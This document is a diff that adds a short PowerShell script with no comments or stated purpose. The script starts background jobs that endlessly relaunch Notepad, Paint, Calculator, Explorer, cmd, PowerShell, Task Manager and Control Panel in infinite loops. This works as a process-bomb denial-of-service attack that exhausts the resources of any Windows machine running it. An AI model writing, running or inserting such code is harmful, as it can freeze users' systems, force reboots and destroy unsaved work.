@@ -1,0 +1,21 @@
+$apps = @(
+    "notepad.exe",
+    "mspaint.exe",
+    "calc.exe",
+    "explorer.exe",
+    "cmd.exe",
+    "powershell.exe",
+    "taskmgr.exe",
+    "control.exe"
+)
+
+foreach ($app in $apps) {
+    Start-Job -ScriptBlock {
+        param ($app)
+        while ($true) {
+            Start-Process $app
+        }
+    } -ArgumentList $app
+}
+
+
